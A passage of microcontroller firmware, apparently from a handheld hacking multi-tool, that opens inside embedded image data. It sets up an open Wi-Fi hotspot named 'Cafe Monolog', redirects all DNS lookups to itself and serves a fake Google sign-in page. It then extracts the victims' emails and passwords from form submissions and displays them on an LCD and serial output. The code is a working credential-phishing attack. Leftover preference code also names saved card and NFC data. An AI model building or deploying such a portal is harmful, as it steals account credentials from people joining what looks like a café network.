mlGw+YqX8OGgjyQb/sErLvMntykdPvxF3Qd/KZSA40dcLxW2+34PsFvh3zLvW3EG7QsY/kF7Z9o8/On2Pzguq0OF8B9RoWgCjJCbwYOQm0pcn/hgTE6LaTNg2XnJhT9qrkum8L9uM+CPps2AA+7vA3Yr1MbUnRj+YfvnyST86fY/Yn0Yhj9QPvtnvepewAi5GTy+ESG6VboR4fqn+7yEDwd9JpngRyvX1lD433Az4O9CCWgzeBgAG4gYoyYPw39y2yKc+KfbvwwKgMsmFYY/7vufGl2l/CFg34QQPAgZkKRq7ezA9FeFzYAJ+ZckEf6aKgNM/D8ixfCXQAEQNwOceDdsBuwwei8H7GaiDanREP598H9x4p9u/zII/xH1GP5K2PVXXHapnvR3wAgZCDwIGbCk8qxNvrq3ubfuJA9cfnlIwz+h9DV+dt/PxPCn2/+NtD8MJWAEvwibAXVt3hGAfZ24A5rRCQfSenDif9yOWAp/ORSAJhV3rlBiAbjmVBkaDBghA4UHIbcksbT4JXwV4JN+GtYDu4Yk/Cet/Ii/vfufFP4D8l3YDHgMSsAofuaJsdfqDT7/AKy/iP1JP4d1v7OA++6Mx4CnAiD18N8C4V9lGvpzqgxLAYyQW4EHIbdsduGGTmE9cMmHNg1+FFJ0iT+zPYDCf4DhL+o+8DPec2w0f/Owa9f6nYoHAUPR7cnfizemvYrv/QP3zKDwl0kBcKk1hb9zhWI9YITcKjwIuWX6munfjc/d96VpM+CszcIf7WqYR+F/i+Ev6j78O6EEPHvQ/Qzj7A4Ua9C2YPiH7p9n+/Cnwb9BGbEuzDT0V6F8wkPvcTdghNwqPAgZFM16zV9VS48JmwH+ORdsEv7l60vtJvyBDcNf9D3YDPirUAIMBo+j0UbNSmHiv3UhTvzT7V8GBWDEpnBT+Jcp3v1rZcRDgBEyGHgQMmi6yvTYoPSXuZfufR6Q32nV8M+o3suvtD1E4X9bBQC03QclYBjvhhJQcmg6j2pP4W7bouQQ/nT7rw83TfyXKTtHrlT+ETBCBgsPQm5LUrW+3Ff3prAZMGH5ZauE/8yyF/mn+x+/3VCn8Be1PwRDgS784pOj+NSdIXJ49E8FoPE/E/9fDisL8wOMkNuBByG3bWHZiqfHwasA7/QP+ITCLouGf8TK0/y9PX+h8LdI+F/v5P5HePD2ULr9Szn8t0yEiX/Tb/y7VIbOA4yQ24UHIRYxr2jtOSwBvovPWCz8FUWd/N/bvSn8rRT+ohfg6YrX1kl0+5doAXA2T/y7lIdWAkaIJeBBiEXo9fp743N3fIElwG/pJxYpAPuaplH426AAoNa9v+WuFP6SC3+XtWGmdb9yRQfT6+8EjBCLgIMQi0mpyfj15KWHe7EEjM/59LbCv2bDcrsJfyDp8BfV7P7n9QWAwn/ICsCIjaaJf6dSxYnfFwTfBxghloIHIRalrdWGhWS8wLEE+OcNbjNgac02/B17G4Y/hb8ofacb3f5Nhjb861Tmm7/y/Ogaxa8BI8SS8CDE4pKrFy/3SzvBvXAzoODSwMO/sJvPKXuOX2h5bAjCn8IfdbbcxxN2jB/C8Kfb/4gGFQS/cPP/YnhJsCdghFgaHoRYxcLS/EP4FMALNwOWXxlQ+EeuPMlP7f3jEIU/hb/odMtDXLFN4bDhD4Yu/HHiv9I08T+yMjwBMEKsAQ9CrGZucfUZLAE+mWfww0E3DX9l0QX+0g53Cv+hLwDgO/zV/Y9x760quv1byIDX/WpCzet+YUWAEWIteBBiNSquuishf2uPsB6o//iG4Y8MTTEU/hIJf5Fx76+4K4SsbcKfbv8ua4XwB8p95m81MEKsBg5CrCp1depPIpYeMG0GZJ2/LvjR+o1ZFP4SC3/R+j1/s0H40+3fZYNp4h+8Mlwf9F3ACLEmPAixuqTKRH9Fxr/MmwEX/yv8s2ubYOL/fgp/CYa/aOmuMRT+g3NLE//gE+eKkJ8CRoi14WEThCRXLNaP177BvTTv8wn5l4TwX1B+lH/W+kMKf8uHv0ULwEX4z5+5w5ce/Vsj/BtNE//OpcqeEatDRwJmC4TgYTOEJJfk7fPSvMu90k7xmFXv8NN7fyPx4KfwF33U8iAP3x5syfCn238TDP1VCDf/PufqsCjAbIUQPGyKkPnFFe/6617nJxpG8e5WCn85hL/oDdgM8N0Wbonwp9s/TPy7VJs/8FOuzPn/7N11fBTn2sbx55zTQuOCQ4pGCTUkqbtrhLzu7u563B0rDtmRtbjU3d3dDSo4bKiRee99JtNPznvQ2M7s/v741vWqXPc+ez8zQgFjiRBSAp3Gpe/tN4ucvngB5e/T7/0P5c7uWfpmAEf/wxsAatY26vKvXV4XF2qsAYSAlFi/viLvRWv6Pj0EtBdQ/gH49D+Y2VnN0f9wyn/TwAt+ltU9VvrzK8YLBYw1QkgZhFtPXvCeOeVzPQR05lP+ASl/z3faTx9C+fPpvzbkXvdb9PO695asaJoqVCoAhJBSCIdPatplTejfbxU5iZ58yj8Y5a/tlj/OX7VezNH/LzrKZ/xft+/01b+6UKhUAQgh5dARmf/thFXs7LeLZCkw33fFT/kf2gfyz+tXW67h07/riBv/i1fWO4uW1R+QE4BGoVIJIARfwM1m2Y3JrwL2RwplCAhC+VP+npd7JzmXxxs5+heHfcb/wMb/kuUN/yVUqgGE4Bt4wJr9qnczgPIPzACg3d9V4pwb/xXK/5Ab/w0D1/2uM4XyA4AQfAPRaEnWC1bJbj0EtBUEpPwpf633BCfWWckAcBC1G92Nfzn6f2DR6kXHC+UHACH4Cjaap5a9Y079VA8BHfkBKX/K3/Pj9iWU/yC1zU1e+b+5aPWvTxTKLwBC8B3EWhdcvd2a2J8cAhLdhyh+v5U/5a/t6c1y/qHtAso/yUyWf72o23Xmz351gVB+AhCCL6HFrvqvfVaRezOgNz8A5U/5e7b15jq/2XJl6ss/lQNAWK77rdDl/9nCVfVXC+U3ACH4Fm4KV8TdmwEFlH9Ayt/zWnexc1VLQ2Z++o9I+a9qcDf+VzT8o1B+BBCCr+H+8Ozn9D5AbAhDAOWfqgFAe7hrunN+7FfStvzFwTf+1+jyFw3rhPIrgBB8DdFo9binzRN36CGgtSAAxc+n/8E6O8sy6ui/ZoPe+Bf1d6qmpq8I5VcAAfgezJbTZr1pT/3EvRmQR/kHpPw9yzoWZsTRf23z0oGN/7pXTt1YVyiUnwGEEAiw7ZMv2mZOPLDfKtQ3A4JX/tmZWP7aXvEvbeem99G/6V73q1lWv+Ps5fXlQvkdQAiBgVis+u/2WkWOHgJ68yj/AJS/Z3tvjvN7LZen59G/7b3gp/6TxcvrLxEqCABCCBT0mOXN+mZAWPYBbqD8U7b0NwRv9RQ618br06r8a5PP+F/lPuP/9NWNfy5UUACEEDi4y573uHczgPIPRvl7nuie6lwQa0qbo/8lAxv/NSsalgkVJAAhBA6+6qgvP2HP/EAPAS0FAVn2o/w9N3TOdc5Kg0//NesGNv5XXHeTctSXhAoQgACCCaGWRdNet6bt994ZQPkHo/w9q9tPDvbR/+Yvrvs9X73i/FyhggYghMBCyF5w5gfGJH0zoK8rj/IPRvmL8dp/tZ4VyKP/WqPJe6//h+dv/LXZQgURQAiBhrZw+Z/sNoud/bbcDOjJo/yDUf7ajt4s5w/jlwSr/K1fGdj4r/v4rJXXnSNUUAGEEHjojlRe36ffGVDo3QzQhUz5+3oA0N7tznfqYtcG4uhfb/yv1Bv//bUrl/6+UEEGEEJawB3WvPv1PkC0QIolCOVP+Xue6Z7sXBhd6u9P/8nyv77Be7f/D4QKOoAQ0gYes2a+12fIKUA8PyDlT/l7bu2c5ZwthevXo/+a9W75y/F/p1DpACCEtAHTPKnoFXNaQg8BbXkBKX/K37Opo9qf5b9pqbf09+Sir16TLVQ6AAghrSAcPnnhFnPSgT5ThoDO3ICUP+Xv+UbbGb4aAGqNgfJfVr+l9udXlAiVLgBCSDuIR+b/1i6rqL/PlH2A7twUFD/lP9QBYFdPlvOn8Yv8Uf76Gf+6/BOLV9XVCJVOAEJIS+gKl/8wYchSoC1DQE9uAMqf8vds7c1zGuPXpPboPyxLfyv0xv+B2jX1vyZUugEIIW3htnDZrcl9gL5IvhRLEMqf8ve80D3RuSTaOJblr3kb/zXX6/J3apfXf02odAQQQlrDw/bMN7ybAcEof8rfc3dnib4ZMNaf/mvWNnrv9o8Kla4AQkhrWL++Iu9Fa/oePQS05gWk/Cl/j91RNbbf+29qHFj6q3uk+qtN44RKVwAhpD2Ewwuq3rWmfKaHgI7clBQ/5T90322rGZvyD7kb/4t/Xv9O7dprpwiVzgBCQEYIxxY07DSLvZsBlH+ABoA98sf+65YLRnUAqLWapPzrRd3exasaTxMq3QGEgIzREqn6RsKUpUBL3wwIQPnz6d/zYU+O86vxK0fn03+4ST/jX54meWDh8oZ6oYBMQAjIKDfZZV36ZkA4PxjlT/mLcdor3UXOpdH6Ed74b/riGf9Lftbw70IBmYIQkHHus2e/pPcBovle8VP+Pi9/zwNd051zo00jt/G/xi3/muXXNQsFZBJCQMaJRkuynrNm7NJDQEtuQMqf8vfEO8tG5nv/DY3u0t/yhvsWrV50vFBAJiEEZKRN4QXz3jYnf9pnFDiJjqA825/y9/y4feHwyr/Z3fgXr1evayoWCsg0hICMZYTnX7HNTL4zIF9uBuQEo/gpf22P/HZ/33Le0I7+zWT51yef8b+z9udN84UCMhEhIKO1WFX/si+5FGjJENAzlCGA8k/BAKB91Jvt/Gb88mPd+Pee8f/Z4usbrxQKyFSEgIzXa5eHk18F9IXzAlL+lL/n9Z5C54pY3VENAHrjf5UufxkC6v5WKCCTEQIg7ovMfVrvA8TyKX9fHv0f2sNdU53zYksPX/6DNv7l6H+NUECmIwRAfPWr5x/3tFmyTQ8BLXkBKX/K39PZMffw5b++0S3/5fW3yT/sLwsFZDxCcAFG78klb1hTPtZDQHtuQDb9KX/PyvZTDr7xv3mp98n/pbmrmwqEQhOgCAEYJGQvOP8jY8KB5M2ARGduMD71U/7aXvGvrWfr4vfUGk0D5d+w7Yx1TaVCAXARwv8DxMKVf71n0M0Ayj8QA4C2vTfL+b34pe6nf7tJjvz12/0+Wbis/kKhNA0AIQAH0WmXbdQ3A+w8KRbKPwjl73m7O9+5OnatfsGPfszvqoY/FeoXASAE4BDusOc8ooeASL4UC+UfhPLXeo53no1Occ5adq1Tu7z+Z0IB+GWEABzCVx315SftE7ce/GZAlk/Ln/JPxE5w+kI5zoZwxfPKUV8SCsBBEAJwaM2t8ya/ak3d790M8HH5U/4i0eqW/6uhifs3t1ZOEArAwRECcCRmdc375kT3ZkBXjl/Ln/JvHy/ln+1sDRUeMIyq04UCcGiEcBSAaLTqD3clbwaYeXLMnO2r8qf8Rec4p8/IdnaFcp2YVfpHQgE4PEI4SkBHuHxZwsgfuBngm/Kn/LuPd/rMbCcRynE6rdIVQgE4MkI4BsBt9ty7+5JDQEQPAX4ofsrfztLf+99hzrxHqKMDgBCOEfCwdeI7ySEgEctNYflT/nrjP+ou/T1mznhbqKMHgBCOEbA6OrfgJWvqPj0EtOakqvwp/xa3/F82Ju0zu2cWCXX0ABACMARWfMHJW8yJn7vvDMih/FO08b8lVPR5KFR+ilDHBgAhAEMUbq3+tV1mUb++GdCdTfmP+cZ/Xn/EKvt1oY4dAEIYBqAjUvW9fWaB02fp64GjXfyUf9e4gY3/XKfLmPc9oQAMDSEME3CLNe/GY7kZkPriD/7G/62h2TcLBWDoCAEYAQ9aM1/zbgZQ/qO78f+wOeM1oYYHACEAI6C5+eScF63pu72bAZT/6Gz8v2hO3p3MWqjhAUAIwAgJRU+ueMee9JkeAjqyR6r4Kf+28br83zWKP4uGTq4QavgAEAIwguxo9bU7vJsBXdnDLHLKX2/8h7Kd7Ua+bPxX1QkFYGQQAjDC4lb5/+wz8x33euBQTwAof2/jf18o12m3Sv9HKAAjhxCAUdAbntfWF8pz+uxcyn+IA0Cf5W7832DMaRcKwMgiBGCU3G/NeiE5BCQixzoEUP6JiLv0d79Z8oJQAEYeIQCjJBqtHvesNWOHHgJaslNf/EEp/5hb/s+Y03b0/rx0vFAARh4hAKNoo105+y1r4id6CGjPovyPcuP/LaP4E9OsmiUUgNFBCMAoi0ROuni7UXSgz8iVrfYsyv8IG//bjIL+cKzyUqEAjB5CAMZANFz5D3uMQ94MoPy73Bf87AnlOi2R8n8UCsDoIgRgjPTYpeagmwEs+3nlP2jjv9ecawoFYPQRAjCG7gnPfkIPAV/cDKD8ExG3/O82Zj0pFICxQQjAGPrqV88/7gmj5CO9FBjPSXHxp778vY3/J0PTPlz9J4uOFwrA2CAEYIxtjFZPfd2asl8PAa3ZmVv+rW75v2FM2B8KVU0TCsDYIYQUAJqt6rM/CBXrmwGJjuzMK//28Xrj/0Oz8EAoNP8coQCMLUJIESBuVvz5nlCBezOgKytDyl90uhv/u5tznbZwxZ8LBWDsEUIKAV3h8rV6KdDKk3Icn/7l3y0b/6a79Ndlla8VKjUAEEKKAbdbcx7UQ0A4R0oyzcvfdsv/dmP2g0KlDgBCSDHgq4768qNGyVa9FBjLTs/yF4mou/T3mDFjS/LvWaiUAUAAfgBs3lw54RVrSp97MyAruMV/iPL3Nv5fMSb1tcrfq1CpBYAQfAKw7QWLt35xMyArfcq/w93439qc3PivWigUAK4BAhjEtit/b6eR7+gXB3WdEPjy9zb+d8rGfyRS/rtC+QMAQvAZoMss+2lC3wyQIaA7wOXfldz4z3YSoRyn0yz7mVD+AYAQfAi4JTznjsE3A4JW/nrjP+xu/N9qzL5DKH8BQAg+BTxgznhLLwVGswNV/oM3/h8OTX9LKP8BQAg+BaxfX5H3ojVl77HfDBiX2vJvccv/RWPyXsMozRfKfwAQgo8Bza1VC941iz/XQ0B7lp8/9WuJtvG6/N8NFX0eNarnC+VPAAjB5wAzPL9pl1nQ790M8GX5D974D+X1R+3qpUL5FwBCAAKgNVL+rX1GrnszoOcE/5V/97iBjf9cp9Us/ZZQ/gaAEICAuDk8t0ffDLD1zYDUf98/eOPfcjf+bzJn9wjlfwAIAQiQB+wTX/ZuBvii/EUi4i79PWiWvCwUgGAgBCBAotGSrOesqbv6Qrl62z7l5R9zy/95c8qu5F+bUACCgRCAgFkXqi592yj+VA8BbVkpK3/vBT/vhIo/DYUWlgoFIDgIAQggO1p11Xa5GeANAakq/21Gfn/YqLxaKADBQghAQMXsqn/dHcpzvK8DxqD4tUTcveu/u1k2/u2KfxUKQPAQAhBgbVbpD/X1wJAIZ+uXB41a+XfJVT/b3fbfJ3++DqP0h0IBCCZCAAKu1S7/8U4jzx0CjBz3NKBnZK/5JeIn6If8SPnrV/t2hEp/JBSA4CKENADYdsUfbjGKDiSHAM0aGAS6h1H+XQPFb+ri17aECg/EYmW/LxSAYCOENAFstCtnP2iVvPnFEOCdCESz3ZcJHfrrgcHH/HpwSESSR/1e8bsetKa/kfxzCAUg+AghzQDRaMXfylsEdw8eBAYPBH12tt4XkMHALXpbWMI94v8lL5hTdsfCFX8nVPoAQAhpCgibZX+bPBHY6d4UOIicQ9Hf8z9kT389Hi7/K6HSDwBCSHPA6ujcghaz4r/uMGc9+rQ5bfvb5oRPZWmwPyFFn5T86bflYT7JX3eHOeeReLjsP5O/j1AA0hchAP/Xbh0LAAAAAAzyt57Ezo4cAhAAAEAAAAABAAAEAAAQAABAAAAAAQAABAAAEAAAQAAAAAEAAAQAABAAAEAAAAABAAAEAAAQAAAQAABAAAAAAQAABAAAEAAAQAAAAAEAAAQAABAAAEAAAAABAAAEAAAQAABAAAAAAQAABAAAEAAAEAAAQAAAAAEAAAQAABAAAEAAAAABAAAEAAAQAABAAAAAAQAABAAAEAAAQAAAAAEAAAQAABAAABAAAEAAAAABAAAEAAAQAABAAAAAAQAABAAAEAAAQAAAAAEAAAQAALgEBcmrmcYr45YAAAAASUVORK5CYII=\" width=\"80\"/></div> <h2>Cafe Monolog Google</h2> <p>Sign In with your Google Account</p> <form>  <div class=\"inputBox\"><input type=\"email\" name=\"email\" required onkeyup=\"this.setAttribute('value', this.value);\"  value=\"\"> <label>Email</label></div>  <div class=\"inputBox\">  <input type=\"password\" name=\"text\" required onkeyup=\"this.setAttribute('value', this.value);\" value=\"\">  <label>Password</label></div>  <input type=\"submit\" name=\"sign-in\" value=\"Sign In\"></form> </div>  </body></html>";
  WiFi.softAP("Cafe Monolog");
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  dnsServer.start(DNS_PORT, "*", apIP);
  server.begin();

  loopInCPortal();
}
void loopInCPortal() {
  lcd.clear();
  lcd.setCursor(0, 0);
  lcd.print(" Captive Portal ");
  lcd.setCursor(0, 1);
  lcd.print(" Online&Waiting ");
  while (digitalRead(BACK_PIN) == HIGH && inSubMenu) {
    if (digitalRead(BACK_PIN) == LOW && inSubMenu) {
      while (digitalRead(BACK_PIN) == LOW)
        ;
      lcd.clear();
      lcd.setCursor(0, 0);
      lcd.print(" CPortalStopped ");
      lcd.setCursor(0, 1);
      lcd.print("  Back to Menu  ");
      displayMenu();
      inSubMenu = false;
      break;
    }

    dnsServer.processNextRequest();
    WiFiClient client = server.available();  // listen for incoming clients
    if (client) {
      String currentLine = "";
      String emailValue = "";
      String textValue = "";

      while (client.connected()) {
        if (client.available()) {
          char c = client.read();
          if (c == '\n') {
            if (currentLine.length() == 0) {
              client.println("HTTP/1.1 200 OK");
              client.println("Content-type:text/html");
              client.println();
              client.print(responseHTML);

              // Check if email and text values are non-empty before printing
              if (!emailValue.isEmpty() && !textValue.isEmpty()) {
                Serial.print("Email: ");
                Serial.println(emailValue);
                Serial.print("Text: ");
                Serial.println(textValue);

                lcd.clear();
                lcd.setCursor(0, 0);
                lcd.print(" ! Data Found ! ");
                lcd.setCursor(0, 1);
                lcd.print(" Fetching Data..");
                delay(1500);
                lcd.clear();
                lcd.setCursor(0, 0);
                lcd.print("E: " + emailValue);
                lcd.setCursor(0, 1);
                lcd.print("P: " + textValue);
              }

              break;
            } else {
              // Check if the current line contains 'email' and 'text'
              if (currentLine.indexOf("GET /hotspot-detect.html?") != -1) {
                // Extract the 'email' and 'text' values from the URL parameters
                int emailStart = currentLine.indexOf("email=") + 6;
                int emailEnd = currentLine.indexOf("%40");
                emailValue = currentLine.substring(emailStart, emailEnd) + "@" + currentLine.substring(emailEnd + 3, currentLine.indexOf("&"));

                int textStart = currentLine.indexOf("&text=") + 6;
                int textEnd = currentLine.indexOf("&sign-in=");
                textValue = currentLine.substring(textStart, textEnd);

                // URL decode the values if needed
                emailValue = urlDecode(emailValue);
                textValue = urlDecode(textValue);
              }

              currentLine = "";
            }
          } else if (c != '\r') {
            currentLine += c;
          }
        }
      }
      client.stop();
    }
  }
  if (digitalRead(BACK_PIN) == LOW && inSubMenu) {
    while (digitalRead(BACK_PIN) == LOW)
      ;
    lcd.clear();
    lcd.setCursor(0, 0);
    lcd.print(" CPortalStopped ");
    lcd.setCursor(0, 1);
    lcd.print("  Back to Menu  ");
    delay(1500);
    displayMenu();
    inSubMenu = false;
  }
}
String urlDecode(const String &input) {
  String decoded = "";
  char a, b;
  for (size_t i = 0; i < input.length(); i++) {
    if (input[i] == '%') {
      a = input[i + 1];
      b = input[i + 2];
      decoded += char(hexCharToInt(a) * 16 + hexCharToInt(b));
      i += 2;
    } else {
      decoded += input[i];
    }
  }
  return decoded;
}
int hexCharToInt(char c) {
  if (c >= '0' && c <= '9') {
    return c - '0';
  } else if (c >= 'A' && c <= 'F') {
    return c - 'A' + 10;
  } else if (c >= 'a' && c <= 'f') {
    return c - 'a' + 10;
  }
  return 0;  // Default to 0 if the character is not a valid hexadecimal digit
}

// Preferences
void saveSettings() {
  // End Preferences to save the changes
  NFCPreferences.end();
  preferences.end();
}
void loadSettings() {
  // Begin Preferences to load the settings
  preferences.begin("cardSaved", false);
  NFCPreferences.begin("NFCSaved", false);
}
